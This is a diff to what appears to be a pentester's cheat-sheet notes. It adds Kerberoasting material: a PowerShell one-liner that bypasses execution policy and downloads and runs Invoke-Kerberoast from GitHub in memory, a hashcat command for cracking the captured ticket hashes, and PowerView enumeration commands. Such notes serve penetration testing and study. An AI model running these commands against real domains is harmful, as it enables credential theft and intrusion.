@@ -78,6 +78,8 @@ Pattern
                 Network Authentication protocol. 
                 Common for Windows Domain controller.
                 MS14-068
+                https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
+                
             110 Pop3
                 telnet <ip> 110
                 USER pkong@<ip>
@@ -451,9 +453,20 @@ Pattern
            4.2.6  JAWS
                https://github.com/411Hall/JAWS
                
-           4.2.7 NTLM hashes/kerberos
+           4.2.7 NTLM hashes or kerberos ticket
             https://gist.github.com/0xbadjuju/0ebe02983273048c237a8b24633cee3f
             https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
+            Use mimikatz 
+            kerberoast
+               powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt" 
+               hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
+            PowerView.ps1 
+               https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1
+               Import-Module .\Powerview.ps1
+               Get-NetLoggedon -Computername <computername>
+               
+              
+ 
             
             
                     
